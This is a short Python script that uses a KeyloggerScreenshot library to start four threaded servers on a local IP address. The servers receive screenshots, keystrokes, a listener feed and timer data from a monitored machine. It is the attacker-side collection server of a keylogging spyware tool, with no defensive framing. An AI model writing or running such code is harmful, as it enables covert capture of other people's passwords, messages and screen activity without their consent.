import KeyloggerScreenshot as ks
import threading

ip = "192.168.0.74"

ip_photos, port_photos = ip, 1234
server_photos = ks.ServerPhotos(ip_photos, port_photos)

ip_keylogger, port_keylogger = ip, 1235
server_keylogger = ks.ServerKeylogger(ip_keylogger, port_keylogger)

ip_listener, port_listener = ip, 1236
server_listener = ks.ServerListener(ip_listener, port_listener)

ip_time, port_time = ip, 1237
server_time = ks.Timer(ip_time, port_time)

threading_server = threading.Thread(target=server_photos.start)
threading_server.start()

threading_server2 = threading.Thread(target=server_keylogger.start)
threading_server2.start()

threading_server3 = threading.Thread(target=server_listener.start)
threading_server3.start()

threading_server4 = threading.Thread(target=server_time.start_timer)
threading_server4.start()
